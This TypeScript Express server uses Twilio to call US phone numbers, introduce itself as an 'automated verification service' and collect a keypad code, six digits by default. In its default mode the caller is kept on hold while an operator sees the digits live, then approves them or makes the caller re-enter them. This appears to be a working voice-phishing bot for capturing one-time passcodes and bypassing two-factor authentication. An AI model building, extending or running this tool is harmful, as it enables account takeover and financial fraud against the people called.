import express, { Request, Response } from 'express';
import { createServer as createViteServer } from 'vite';
import path from 'path';
import { fileURLToPath } from 'url';
import twilio from 'twilio';
import { GoogleGenAI } from '@google/genai';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;
const isProd = process.env.NODE_ENV === 'production';

app.set('trust proxy', true);
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Dynamic public base URL helper that auto-detects live production domains (e.g. from reverse proxy headers)
export function getPublicBaseUrl(req?: Request): string {
  if (process.env.APP_URL && !process.env.APP_URL.includes('localhost')) {
    return process.env.APP_URL.replace(/\/$/, '');
  }

  if (req) {
    const proto = (req.headers['x-forwarded-proto'] as string) || req.protocol || 'https';
    const host = (req.headers['x-forwarded-host'] as string) || req.headers.host;
    if (host && !host.includes('localhost') && !host.startsWith('127.0.0.1')) {
      return `${proto}://${host}`.replace(/\/$/, '');
    }
  }

  return process.env.APP_URL || `http://localhost:${PORT}`;
}

export interface CallSession {
  id: string;
  to: string;
  from: string;
  status: 'queued' | 'initiating' | 'ringing' | 'in-progress' | 'collecting-input' | 'awaiting-operator' | 'completed' | 'busy' | 'failed' | 'no-answer';
  introGreeting: string;
  script: string;
  verificationMode: 'manual' | 'auto';
  holdMessage: string;
  expectedCode?: string;
  invalidMessage?: string;
  successMessage?: string;
  maxAttempts?: number;
  attempts?: number;
  codeStatus?: 'pending' | 'awaiting_operator' | 'valid' | 'invalid' | 'max_exceeded';
  pendingDigits?: string;
  operatorDecision?: 'pending' | 'approved' | 'rejected';
  activeCue?: { text: string; timestamp: string };
  lastInvalidDigits?: string;
  voice: string;
  inputMode: 'dtmf' | 'speech' | 'dtmf speech';
  numDigits: number;
  keypadActions: Record<string, string>;
  capturedDigits?: string;
  capturedSpeech?: string;
  confidence?: number;
  duration?: number;
  isSimulated: boolean;
  createdAt: string;
  completedAt?: string;
  events: Array<{
    id: string;
    timestamp: string;
    type: 'system' | 'call-state' | 'playback' | 'gather' | 'dtmf' | 'speech' | 'error';
    title: string;
    description: string;
    data?: any;
  }>;
}

// In-memory sessions storage
const sessions = new Map<string, CallSession>();

// Active Server-Sent Event clients per callId
const sseClients = new Map<string, Set<Response>>();

function broadcastEvent(callId: string, eventName: string, data: any) {
  const clients = sseClients.get(callId);
  if (clients && clients.size > 0) {
    const payload = `event: ${eventName}\ndata: ${JSON.stringify(data)}\n\n`;
    for (const res of clients) {
      try {
        res.write(payload);
      } catch (err) {
        console.error('Error writing SSE to client:', err);
      }
    }
  }
}

function addSessionEvent(session: CallSession, event: Omit<CallSession['events'][0], 'id' | 'timestamp'>) {
  const fullEvent = {
    ...event,
    id: `evt-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`,
    timestamp: new Date().toISOString(),
  };
  session.events.push(fullEvent);
  broadcastEvent(session.id, 'call-event', fullEvent);
  broadcastEvent(session.id, 'session-update', session);
  return fullEvent;
}

// System configuration endpoint
app.get('/api/config', (req: Request, res: Response) => {
  const accountSid = process.env.TWILIO_ACCOUNT_SID || '';
  const authToken = process.env.TWILIO_AUTH_TOKEN || '';
  const phoneNumber = process.env.TWILIO_PHONE_NUMBER || '';
  const appUrl = getPublicBaseUrl(req);
  const hasGemini = Boolean(process.env.GEMINI_API_KEY);

  res.json({
    hasTwilioAccountSid: Boolean(accountSid.trim()),
    hasTwilioAuthToken: Boolean(authToken.trim()),
    hasTwilioPhoneNumber: Boolean(phoneNumber.trim()),
    isTwilioConfigured: Boolean(accountSid.trim() && authToken.trim() && phoneNumber.trim()),
    configuredPhoneNumber: phoneNumber ? `${phoneNumber.slice(0, 5)}...${phoneNumber.slice(-4)}` : null,
    appUrl,
    hasGemini,
  });
});

// Server-Sent Events stream for real-time call telemetry
app.get('/api/call/events/:callId', (req: Request, res: Response) => {
  const { callId } = req.params;

  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache, no-transform',
    Connection: 'keep-alive',
    'X-Accel-Buffering': 'no',
  });

  res.write(`data: ${JSON.stringify({ type: 'connected', callId })}\n\n`);

  if (!sseClients.has(callId)) {
    sseClients.set(callId, new Set());
  }
  sseClients.get(callId)!.add(res);

  // Send initial session data if already exists
  const session = sessions.get(callId);
  if (session) {
    res.write(`event: session-update\ndata: ${JSON.stringify(session)}\n\n`);
  }

  // Heartbeat ping every 15 seconds to keep connection alive
  const heartbeat = setInterval(() => {
    res.write(': heartbeat\n\n');
  }, 15000);

  req.on('close', () => {
    clearInterval(heartbeat);
    const clientSet = sseClients.get(callId);
    if (clientSet) {
      clientSet.delete(res);
      if (clientSet.size === 0) {
        sseClients.delete(callId);
      }
    }
  });
});

// Get session details
app.get('/api/calls/:callId', (req: Request, res: Response) => {
  const session = sessions.get(req.params.callId);
  if (!session) {
    return res.status(404).json({ error: 'Call session not found' });
  }
  res.json(session);
});

// List recent calls
app.get('/api/calls', (req: Request, res: Response) => {
  const list = Array.from(sessions.values()).sort(
    (a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
  );
  res.json(list.slice(0, 25));
});

// Initiate Call endpoint
app.post('/api/call/initiate', async (req: Request, res: Response) => {
  try {
    const {
      to,
      introGreeting = 'Hello, thank you for answering. This is an automated verification service.',
      message,
      verificationMode = 'manual',
      holdMessage = 'Kindly hold while your information is being processed.',
      expectedCode,
      invalidMessage = 'That code is incorrect. Please re-enter your code on your keypad now, followed by the pound sign.',
      successMessage = 'Thank you. Your code has been verified successfully. Your request has been confirmed. Goodbye.',
      maxAttempts = 3,
      voice = 'Polly.Joanna',
      inputMode = 'dtmf',
      numDigits = 6,
      keypadActions = {},
      mode = 'auto', // 'live' | 'simulator' | 'auto'
      customTwilio,
    } = req.body;

    if (!to || !message) {
      return res.status(400).json({ error: 'Target phone number and voice prompt are required.' });
    }

    // Clean & validate target phone number to E.164 (+1XXXXXXXXXX)
    const digitsOnly = to.replace(/\D/g, '');
    let formattedTo = to.trim();
    if (digitsOnly.length === 10) {
      formattedTo = `+1${digitsOnly}`;
    } else if (digitsOnly.length === 11 && digitsOnly.startsWith('1')) {
      formattedTo = `+${digitsOnly}`;
    }

    const e164Regex = /^\+1[2-9]\d{9}$/;
    if (!e164Regex.test(formattedTo)) {
      return res.status(400).json({
        error: `Invalid US phone number: "${to}". Must be a valid 10-digit US number (+1 [2-9]XX-XXX-XXXX).`,
      });
    }

    // Resolve Twilio Credentials
    const accountSid = customTwilio?.accountSid || process.env.TWILIO_ACCOUNT_SID;
    const authToken = customTwilio?.authToken || process.env.TWILIO_AUTH_TOKEN;
    const twilioPhone = customTwilio?.phoneNumber || process.env.TWILIO_PHONE_NUMBER;

    const canUseLiveTwilio = Boolean(accountSid && authToken && twilioPhone);
    const useSimulator = mode === 'simulator' || (mode === 'auto' && !canUseLiveTwilio);

    if (mode === 'live' && !canUseLiveTwilio) {
      return res.status(400).json({
        error: 'Twilio credentials not configured. Please supply Twilio Account SID, Auth Token, and Twilio Phone Number in Settings, or select Simulator mode.',
      });
    }

    const callId = `call_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`;

    const newSession: CallSession = {
      id: callId,
      to: formattedTo,
      from: twilioPhone || '+18005550199',
      status: 'queued',
      introGreeting: introGreeting.trim(),
      script: message.trim(),
      verificationMode: verificationMode === 'auto' ? 'auto' : 'manual',
      holdMessage: holdMessage.trim(),
      expectedCode: expectedCode ? expectedCode.trim() : undefined,
      invalidMessage: invalidMessage.trim(),
      successMessage: successMessage.trim(),
      maxAttempts: Number(maxAttempts) || 3,
      attempts: 0,
      codeStatus: 'pending',
      voice,
      inputMode: 'dtmf',
      numDigits: Number(numDigits) || (expectedCode ? expectedCode.trim().length : 6),
      keypadActions: keypadActions || {},
      isSimulated: useSimulator,
      createdAt: new Date().toISOString(),
      events: [],
    };

    sessions.set(callId, newSession);

    addSessionEvent(newSession, {
      type: 'system',
      title: 'Call Session Created',
      description: `Target: ${formattedTo}. Control: ${newSession.verificationMode === 'manual' ? 'Manual Operator Verification' : 'Automatic Match'}. Digits: ${newSession.numDigits}. Mode: ${useSimulator ? 'Interactive Phone Simulator' : 'Live Twilio Carrier'}`,
      data: { to: formattedTo, voice, numDigits: newSession.numDigits, verificationMode: newSession.verificationMode },
    });

    if (useSimulator) {
      // Simulate telephony lifecycle steps with event transitions
      setTimeout(() => {
        const s = sessions.get(callId);
        if (s && s.status === 'queued') {
          s.status = 'initiating';
          addSessionEvent(s, {
            type: 'call-state',
            title: 'Initiating Outbound Handshake',
            description: `Connecting route to local carrier switch for ${formattedTo}...`,
          });
        }
      }, 600);

      setTimeout(() => {
        const s = sessions.get(callId);
        if (s && s.status === 'initiating') {
          s.status = 'ringing';
          addSessionEvent(s, {
            type: 'call-state',
            title: 'Ringing Recipient Phone',
            description: 'Destination terminal is ringing. Waiting for recipient to answer...',
          });
        }
      }, 1800);

      return res.json({
        success: true,
        callId,
        session: newSession,
        mode: 'simulator',
        message: 'Simulator call initialized and ringing. Open the Interactive Phone Mockup to accept!',
      });
    }

    // Live Twilio Call Placement
    try {
      const client = twilio(accountSid, authToken);
      const appBaseUrl = getPublicBaseUrl(req);

      const outboundUrl = `${appBaseUrl}/api/twiml/outbound?callId=${encodeURIComponent(callId)}`;
      const statusCallbackUrl = `${appBaseUrl}/api/twiml/status?callId=${encodeURIComponent(callId)}`;

      addSessionEvent(newSession, {
        type: 'system',
        title: 'Dispatching Twilio API Request',
        description: `Calling Twilio Programmable Voice endpoint with webhook: ${outboundUrl}`,
      });

      const call = await client.calls.create({
        to: formattedTo,
        from: twilioPhone,
        url: outboundUrl,
        statusCallback: statusCallbackUrl,
        statusCallbackEvent: ['initiated', 'ringing', 'answered', 'completed'],
        statusCallbackMethod: 'POST',
      });

      newSession.id = call.sid;
      sessions.delete(callId);
      sessions.set(call.sid, newSession);

      addSessionEvent(newSession, {
        type: 'call-state',
        title: 'Twilio Call Dispatched',
        description: `Twilio Call SID: ${call.sid}. Carrier status: ${call.status}.`,
        data: { callSid: call.sid, status: call.status },
      });

      return res.json({
        success: true,
        callId: call.sid,
        session: newSession,
        mode: 'live',
        message: `Live call placed to ${formattedTo}!`,
      });
    } catch (twErr: any) {
      console.error('Twilio Call Creation Error:', twErr);
      newSession.status = 'failed';
      addSessionEvent(newSession, {
        type: 'error',
        title: 'Twilio Carrier Error',
        description: twErr.message || 'Failed to initiate Twilio voice call.',
        data: twErr,
      });

      return res.status(500).json({
        error: `Twilio call failed: ${twErr.message || 'Unknown carrier error'}`,
        callId,
        session: newSession,
      });
    }
  } catch (error: any) {
    console.error('Call initiation error:', error);
    res.status(500).json({ error: error.message || 'Internal server error' });
  }
});

// TwiML Outbound Webhook - Invoked by Twilio when recipient answers
app.all('/api/twiml/outbound', (req: Request, res: Response) => {
  const callId = (req.query.callId as string) || (req.body.CallSid as string);
  const session = sessions.get(callId);

  const twiml = new twilio.twiml.VoiceResponse();

  if (!session) {
    twiml.say({ voice: 'Polly.Joanna' }, 'Welcome to VoiceDrop Interactive. Session could not be found.');
    twiml.hangup();
    res.type('text/xml');
    return res.send(twiml.toString());
  }

  // Mark session as answered & in-progress
  session.status = 'in-progress';
  addSessionEvent(session, {
    type: 'call-state',
    title: 'Recipient Answered Call',
    description: `Call connected with ${session.to}. Playing immediate pickup greeting.`,
  });

  // 1. Play immediate greeting upon answering
  addSessionEvent(session, {
    type: 'playback',
    title: 'Immediate Pickup Greeting Played',
    description: `Playing synthetic voice (${session.voice}): "${session.introGreeting}"`,
    data: { greeting: session.introGreeting, voice: session.voice },
  });
  twiml.say({ voice: session.voice as any }, session.introGreeting);

  const appBaseUrl = getPublicBaseUrl(req);
  const gatherActionUrl = `${appBaseUrl}/api/twiml/gather?callId=${encodeURIComponent(callId)}`;

  // 2. Configure <Gather> verb to collect multi-digit code
  const gather = twiml.gather({
    action: gatherActionUrl,
    method: 'POST',
    input: ['dtmf'],
    numDigits: session.numDigits || 6,
    finishOnKey: '#',
    timeout: 15,
  });
  gather.say({ voice: session.voice as any }, session.script);

  // If no input was provided during gather
  twiml.say({ voice: session.voice as any }, 'We did not receive your code. Thank you for your time. Goodbye.');
  twiml.hangup();

  session.status = 'collecting-input';
  addSessionEvent(session, {
    type: 'gather',
    title: `Listening for ${session.numDigits}-Digit Code`,
    description: `Gather verb active. Expecting ${session.numDigits} digits (Expected: [${session.expectedCode || 'Any'}]).`,
  });

  res.type('text/xml');
  res.send(twiml.toString());
});

// TwiML Gather Callback - Invoked when recipient enters DTMF code
app.all('/api/twiml/gather', (req: Request, res: Response) => {
  const callId = (req.query.callId as string) || (req.body.CallSid as string);
  const session = sessions.get(callId);

  const digits = req.body.Digits || req.query.Digits;
  const twiml = new twilio.twiml.VoiceResponse();

  if (session && digits) {
    const rawDigits = String(digits).trim();
    const appBaseUrl = getPublicBaseUrl(req);

    // 1. MANUAL OPERATOR REVIEW MODE (Default)
    if (session.verificationMode === 'manual') {
      session.pendingDigits = rawDigits;
      session.codeStatus = 'awaiting_operator';
      session.status = 'awaiting-operator';
      session.operatorDecision = 'pending';

      addSessionEvent(session, {
        type: 'dtmf',
        title: `Code Received: [${rawDigits}] — Awaiting Operator Decision`,
        description: `Recipient entered ${rawDigits.length}-digit code. Playing hold message while dashboard operator reviews.`,
        data: { digits: rawDigits, verificationMode: 'manual' },
      });

      // Play hold message and enter waiting loop for operator decision
      const holdPrompt = session.holdMessage || 'Kindly hold while your information is being processed.';
      twiml.say({ voice: session.voice as any }, holdPrompt);
      twiml.pause({ length: 4 });
      twiml.redirect({ method: 'POST' }, `${appBaseUrl}/api/twiml/wait-operator?callId=${encodeURIComponent(callId)}`);

      res.type('text/xml');
      return res.send(twiml.toString());
    }

    // 2. AUTOMATIC CODE MATCH MODE
    const gatherActionUrl = `${appBaseUrl}/api/twiml/gather?callId=${encodeURIComponent(callId)}`;
    const isValid = !session.expectedCode || rawDigits === session.expectedCode.trim();

    if (!isValid) {
      session.attempts = (session.attempts || 0) + 1;
      session.lastInvalidDigits = rawDigits;
      session.codeStatus = 'invalid';

      const maxAttempts = session.maxAttempts || 3;

      if (session.attempts < maxAttempts) {
        addSessionEvent(session, {
          type: 'error',
          title: `Invalid Code Entered (Attempt ${session.attempts}/${maxAttempts}): [${rawDigits}]`,
          description: `Entered code "${rawDigits}" does not match expected "${session.expectedCode}". Playing retry voice prompt.`,
          data: { entered: rawDigits, expected: session.expectedCode, attempt: session.attempts, maxAttempts },
        });

        twiml.say({ voice: session.voice as any }, session.invalidMessage || 'That code is incorrect. Please try again.');
        
        const gatherRetry = twiml.gather({
          action: gatherActionUrl,
          method: 'POST',
          input: ['dtmf'],
          numDigits: session.numDigits || 6,
          finishOnKey: '#',
          timeout: 15,
        });
        gatherRetry.say({ voice: session.voice as any }, `Please enter your ${session.numDigits}-digit code now, followed by the pound sign.`);

        twiml.say({ voice: session.voice as any }, 'We did not receive your code. Goodbye.');
        twiml.hangup();

        session.status = 'collecting-input';
        res.type('text/xml');
        return res.send(twiml.toString());
      } else {
        session.status = 'failed';
        session.codeStatus = 'max_exceeded';
        session.completedAt = new Date().toISOString();

        addSessionEvent(session, {
          type: 'error',
          title: 'Verification Failed: Maximum Attempts Exceeded',
          description: `Recipient entered incorrect code ${session.attempts} times. Terminating call.`,
          data: { attempts: session.attempts, maxAttempts },
        });

        twiml.say({ voice: session.voice as any }, 'Maximum incorrect attempts exceeded. Please contact customer support. Goodbye.');
        twiml.hangup();

        res.type('text/xml');
        return res.send(twiml.toString());
      }
    }

    // AUTO VALID!
    session.capturedDigits = rawDigits;
    session.codeStatus = 'valid';
    session.status = 'completed';
    session.completedAt = new Date().toISOString();

    addSessionEvent(session, {
      type: 'dtmf',
      title: `Code Verified Valid: [${rawDigits}]`,
      description: `Recipient entered valid ${rawDigits.length}-digit code [${rawDigits}]. Playing confirmation message.`,
      data: { digits: rawDigits, expected: session.expectedCode },
    });

    const confMsg = session.successMessage || 'Thank you. Your code has been verified successfully. Goodbye.';
    twiml.say({ voice: session.voice as any }, confMsg);
    twiml.hangup();

    addSessionEvent(session, {
      type: 'playback',
      title: 'Confirmation Voice Prompt Played',
      description: `Playing synthetic voice (${session.voice}): "${confMsg}"`,
      data: { message: confMsg },
    });
  } else {
    twiml.say({ voice: 'Polly.Joanna' }, 'Thank you. Goodbye.');
    twiml.hangup();
  }

  res.type('text/xml');
  res.send(twiml.toString());
});

// TwiML Wait Operator Loop - Keeps line on hold and reacts to operator decisions or cues
app.all('/api/twiml/wait-operator', (req: Request, res: Response) => {
  const callId = (req.query.callId as string) || (req.body.CallSid as string);
  const session = sessions.get(callId);
  const twiml = new twilio.twiml.VoiceResponse();
  const appBaseUrl = getPublicBaseUrl(req);

  if (!session) {
    twiml.say({ voice: 'Polly.Joanna' }, 'Session has ended. Goodbye.');
    twiml.hangup();
    res.type('text/xml');
    return res.send(twiml.toString());
  }

  // 1. Check if operator sent a real-time spoken cue
  if (session.activeCue) {
    const cueMsg = session.activeCue.text;
    session.activeCue = undefined;
    twiml.say({ voice: session.voice as any }, cueMsg);
    twiml.pause({ length: 3 });
    twiml.redirect({ method: 'POST' }, `${appBaseUrl}/api/twiml/wait-operator?callId=${encodeURIComponent(callId)}`);
    res.type('text/xml');
    return res.send(twiml.toString());
  }

  // 2. Check if operator approved the code
  if (session.operatorDecision === 'approved') {
    session.capturedDigits = session.pendingDigits || session.capturedDigits;
    session.codeStatus = 'valid';
    session.status = 'completed';
    session.completedAt = new Date().toISOString();

    const confMsg = session.successMessage || 'Thank you. Your code has been verified successfully. Goodbye.';
    twiml.say({ voice: session.voice as any }, confMsg);
    twiml.hangup();

    addSessionEvent(session, {
      type: 'playback',
      title: 'Confirmation Message Played & Call Completed',
      description: `Playing synthetic voice: "${confMsg}"`,
    });

    res.type('text/xml');
    return res.send(twiml.toString());
  }

  // 3. Check if operator rejected the code
  if (session.operatorDecision === 'rejected') {
    session.operatorDecision = undefined;
    session.status = 'collecting-input';

    const gatherActionUrl = `${appBaseUrl}/api/twiml/gather?callId=${encodeURIComponent(callId)}`;
    const retryMsg = session.invalidMessage || 'That code is incorrect. Please re-enter your code now, followed by the pound sign.';
    twiml.say({ voice: session.voice as any }, retryMsg);

    const gatherRetry = twiml.gather({
      action: gatherActionUrl,
      method: 'POST',
      input: ['dtmf'],
      numDigits: session.numDigits || 6,
      finishOnKey: '#',
      timeout: 15,
    });
    gatherRetry.say({ voice: session.voice as any }, `Please enter your ${session.numDigits}-digit code now, followed by the pound sign.`);

    twiml.say({ voice: session.voice as any }, 'We did not receive your code. Goodbye.');
    twiml.hangup();

    res.type('text/xml');
    return res.send(twiml.toString());
  }

  // 4. Still awaiting operator: comfort hold message & pause
  twiml.say({ voice: session.voice as any }, 'Thank you for your patience. Please continue to hold.');
  twiml.pause({ length: 4 });
  twiml.redirect({ method: 'POST' }, `${appBaseUrl}/api/twiml/wait-operator?callId=${encodeURIComponent(callId)}`);

  res.type('text/xml');
  res.send(twiml.toString());
});

// Twilio Status Callback - Updates call state in real-time
app.all('/api/twiml/status', (req: Request, res: Response) => {
  const callId = (req.query.callId as string) || (req.body.CallSid as string);
  const session = sessions.get(callId);

  if (session) {
    const callStatus = req.body.CallStatus;
    const duration = req.body.CallDuration ? parseInt(req.body.CallDuration, 10) : undefined;

    if (duration !== undefined) {
      session.duration = duration;
    }

    if (callStatus === 'ringing') {
      session.status = 'ringing';
      addSessionEvent(session, {
        type: 'call-state',
        title: 'Carrier Status: Ringing',
        description: 'Recipient device is actively alerting.',
      });
    } else if (callStatus === 'in-progress') {
      session.status = 'in-progress';
    } else if (callStatus === 'completed') {
      session.status = 'completed';
      session.completedAt = new Date().toISOString();
      addSessionEvent(session, {
        type: 'call-state',
        title: 'Call Completed',
        description: `Session finished. Duration: ${duration || 0} seconds.`,
        data: { duration },
      });
    } else if (['busy', 'no-answer', 'failed', 'canceled'].includes(callStatus)) {
      session.status = callStatus as any;
      addSessionEvent(session, {
        type: 'call-state',
        title: `Call Ended (${callStatus})`,
        description: `Carrier returned status: ${callStatus}.`,
      });
    }
  }

  res.sendStatus(200);
});

// Operator Action Endpoint - Direct manual control of call flow and audio prompts
app.post('/api/call/operator-action', (req: Request, res: Response) => {
  const { callId, action, customMessage } = req.body;
  const session = sessions.get(callId);

  if (!session) {
    return res.status(404).json({ error: 'Call session not found' });
  }

  switch (action) {
    case 'approve':
      session.operatorDecision = 'approved';
      session.capturedDigits = session.pendingDigits || session.capturedDigits;
      session.codeStatus = 'valid';
      session.status = 'completed';
      session.completedAt = new Date().toISOString();

      addSessionEvent(session, {
        type: 'dtmf',
        title: `Operator Approved Code: [${session.capturedDigits}]`,
        description: `Operator manually approved the code. Playing confirmation message to recipient.`,
        data: { digits: session.capturedDigits, decision: 'approved' },
      });
      break;

    case 'reject':
      session.operatorDecision = 'rejected';
      session.attempts = (session.attempts || 0) + 1;
      session.lastInvalidDigits = session.pendingDigits;
      session.pendingDigits = undefined;
      session.codeStatus = 'invalid';
      session.status = 'collecting-input';

      addSessionEvent(session, {
        type: 'error',
        title: `Operator Rejected Code (Attempt ${session.attempts}): [${session.lastInvalidDigits}]`,
        description: `Operator marked code as incorrect. Playing retry voice prompt to caller.`,
        data: { rejectedDigits: session.lastInvalidDigits, attempts: session.attempts },
      });
      break;

    case 'hold':
      const holdText = customMessage || session.holdMessage || 'Kindly hold while your information is being processed.';
      session.activeCue = { text: holdText, timestamp: new Date().toISOString() };
      addSessionEvent(session, {
        type: 'playback',
        title: 'Operator Triggered: "Kindly Hold / Please Wait"',
        description: `Prompting recipient: "${holdText}"`,
        data: { cue: holdText },
      });
      break;

    case 'incorrect_prompt':
      const incorrectText = customMessage || session.invalidMessage || 'The code entered is incorrect. Please try again.';
      session.activeCue = { text: incorrectText, timestamp: new Date().toISOString() };
      addSessionEvent(session, {
        type: 'playback',
        title: 'Operator Triggered: "Code Incorrect"',
        description: `Prompting recipient: "${incorrectText}"`,
        data: { cue: incorrectText },
      });
      break;

    case 'custom_cue':
      if (customMessage) {
        session.activeCue = { text: customMessage.trim(), timestamp: new Date().toISOString() };
        addSessionEvent(session, {
          type: 'playback',
          title: `Operator Spoke to Recipient: "${customMessage.trim()}"`,
          description: `Synthetic voice playing custom message to caller.`,
          data: { cue: customMessage.trim() },
        });
      }
      break;

    default:
      return res.status(400).json({ error: `Unknown operator action: ${action}` });
  }

  res.json({ success: true, session });
});

// Simulator Action Webhook - Used by the interactive phone mockup in the browser
app.post('/api/call/simulate-event', (req: Request, res: Response) => {
  const { callId, action, digits } = req.body;
  const session = sessions.get(callId);

  if (!session) {
    return res.status(404).json({ error: 'Call session not found' });
  }

  switch (action) {
    case 'answer':
      session.status = 'in-progress';
      addSessionEvent(session, {
        type: 'call-state',
        title: 'Recipient Answered Call',
        description: `Call connected with ${session.to}. Playing immediate pickup greeting.`,
      });

      // 1. Play immediate pickup greeting
      addSessionEvent(session, {
        type: 'playback',
        title: 'Immediate Pickup Greeting Played',
        description: `Playing synthetic voice: "${session.introGreeting}"`,
        data: { greeting: session.introGreeting, voice: session.voice },
      });

      session.status = 'collecting-input';
      addSessionEvent(session, {
        type: 'gather',
        title: `Listening for ${session.numDigits}-Digit Code`,
        description: `Prompting: "${session.script}" (${session.verificationMode === 'manual' ? 'Manual Operator Decision' : 'Auto Match'})`,
      });
      break;

    case 'dtmf':
      if (digits) {
        const rawDigits = String(digits).trim();

        // 1. MANUAL OPERATOR CONTROL MODE
        if (session.verificationMode === 'manual') {
          session.pendingDigits = rawDigits;
          session.codeStatus = 'awaiting_operator';
          session.status = 'awaiting-operator';
          session.operatorDecision = 'pending';

          addSessionEvent(session, {
            type: 'dtmf',
            title: `Code Received: [${rawDigits}] — Awaiting Operator Decision`,
            description: `Caller entered ${rawDigits.length}-digit code. Caller put on hold while operator reviews in web console.`,
            data: { digits: rawDigits, verificationMode: 'manual' },
          });

          return res.json({
            success: true,
            session,
            codeStatus: 'awaiting_operator',
            pendingDigits: rawDigits,
            message: session.holdMessage || 'Kindly hold while your information is being processed.',
          });
        }

        // 2. AUTO MATCH MODE
        const isValid = !session.expectedCode || rawDigits === session.expectedCode.trim();

        if (!isValid) {
          session.attempts = (session.attempts || 0) + 1;
          session.lastInvalidDigits = rawDigits;
          session.codeStatus = 'invalid';

          const maxAttempts = session.maxAttempts || 3;

          if (session.attempts < maxAttempts) {
            addSessionEvent(session, {
              type: 'error',
              title: `Invalid Code Entered (Attempt ${session.attempts}/${maxAttempts}): [${rawDigits}]`,
              description: `Entered code "${rawDigits}" does not match expected "${session.expectedCode}". Prompting recipient to try again.`,
              data: { entered: rawDigits, expected: session.expectedCode, attempt: session.attempts, maxAttempts },
            });

            return res.json({
              success: true,
              session,
              codeStatus: 'invalid',
              attempts: session.attempts,
              maxAttempts,
              message: session.invalidMessage || 'That code is incorrect. Please re-enter your code now, followed by the pound sign.',
            });
          } else {
            session.status = 'failed';
            session.codeStatus = 'max_exceeded';
            session.completedAt = new Date().toISOString();

            addSessionEvent(session, {
              type: 'error',
              title: 'Verification Failed: Maximum Attempts Exceeded',
              description: `Maximum incorrect code attempts (${session.attempts}) reached. Ending call.`,
            });

            return res.json({
              success: true,
              session,
              codeStatus: 'max_exceeded',
              message: 'Maximum attempts reached. Goodbye.',
            });
          }
        }

        // VALID CODE IN AUTO MODE
        session.capturedDigits = rawDigits;
        session.codeStatus = 'valid';

        addSessionEvent(session, {
          type: 'dtmf',
          title: `Code Verified Valid: [${rawDigits}]`,
          description: `Keypad capture: Correct ${rawDigits.length}-digit code [${rawDigits}] verified! Playing confirmation.`,
          data: { digits: rawDigits, expected: session.expectedCode },
        });

        setTimeout(() => {
          session.status = 'completed';
          session.completedAt = new Date().toISOString();
          addSessionEvent(session, {
            type: 'call-state',
            title: 'Call Interaction Finalized',
            description: `Confirmation message played: "${session.successMessage || 'Your code has been verified.'}". Call completed.`,
          });
        }, 1500);

        return res.json({
          success: true,
          session,
          codeStatus: 'valid',
          message: session.successMessage || 'Thank you. Your code has been verified successfully. Goodbye.',
        });
      }
      break;

    case 'decline':
    case 'hangup':
      session.status = action === 'decline' ? 'busy' : 'completed';
      session.completedAt = new Date().toISOString();
      addSessionEvent(session, {
        type: 'call-state',
        title: action === 'decline' ? 'Recipient Declined Call' : 'Call Terminated (Hangup)',
        description: `User pressed end call.`,
      });
      break;

    default:
      return res.status(400).json({ error: `Unknown simulator action: ${action}` });
  }

  res.json({ success: true, session });
});

// Hangup endpoint from dashboard
app.post('/api/call/hangup', async (req: Request, res: Response) => {
  const { callId, customTwilio } = req.body;
  const session = sessions.get(callId);

  if (!session) {
    return res.status(404).json({ error: 'Call session not found' });
  }

  session.status = 'completed';
  session.completedAt = new Date().toISOString();

  addSessionEvent(session, {
    type: 'call-state',
    title: 'Call Terminated by Dashboard Operator',
    description: 'Operator pressed End Call button in web console.',
  });

  // If live Twilio call, update call status to completed
  if (!session.isSimulated) {
    try {
      const accountSid = customTwilio?.accountSid || process.env.TWILIO_ACCOUNT_SID;
      const authToken = customTwilio?.authToken || process.env.TWILIO_AUTH_TOKEN;
      if (accountSid && authToken && session.id.startsWith('CA')) {
        const client = twilio(accountSid, authToken);
        await client.calls(session.id).update({ status: 'completed' });
      }
    } catch (err) {
      console.error('Error hanging up Twilio call:', err);
    }
  }

  res.json({ success: true, session });
});

// Optional Gemini API endpoint for AI script optimization
app.post('/api/ai/enhance-script', async (req: Request, res: Response) => {
  try {
    const { prompt, useCase = 'appointment' } = req.body;
    const apiKey = process.env.GEMINI_API_KEY;

    if (!apiKey) {
      return res.status(400).json({
        error: 'Gemini API key is not configured in environment. You can enter scripts manually.',
      });
    }

    const ai = new GoogleGenAI({ apiKey });
    const response = await ai.models.generateContent({
      model: 'gemini-2.5-flash',
      contents: `You are an expert telephony UX scriptwriter. Create an outbound interactive phone call script with clear DTMF options.
User Request / Context: "${prompt}"
Use case category: "${useCase}".

Return ONLY valid JSON with this exact schema:
{
  "script": "The spoken voice prompt that will be read aloud to the recipient by text-to-speech. Must end with clear instructions like: Please press 1 to confirm, press 2 to reschedule, or press 9 to speak with an agent.",
  "keypadActions": {
    "1": "Short label for 1 (e.g. Confirmed)",
    "2": "Short label for 2 (e.g. Reschedule)",
    "9": "Short label for 9 (e.g. Support)"
  },
  "recommendedVoice": "Polly.Joanna" or "Polly.Matthew"
}`,
    });

    const text = response.text || '';
    const cleanJson = text.replace(/```json\n?|\n?```/g, '').trim();
    const parsed = JSON.parse(cleanJson);
    res.json(parsed);
  } catch (err: any) {
    console.error('AI script enhancement error:', err);
    res.status(500).json({ error: err.message || 'Failed to generate AI script' });
  }
});

// Mount Vite or static production files
async function startServer() {
  if (!isProd) {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    app.use(express.static(path.resolve(__dirname, 'dist')));
    app.get('*', (req: Request, res: Response) => {
      res.sendFile(path.resolve(__dirname, 'dist', 'index.html'));
    });
  }

  app.listen(Number(PORT), '0.0.0.0', () => {
    console.log(`VoiceDrop Interactive server running on port ${PORT}`);
  });
}

startServer();
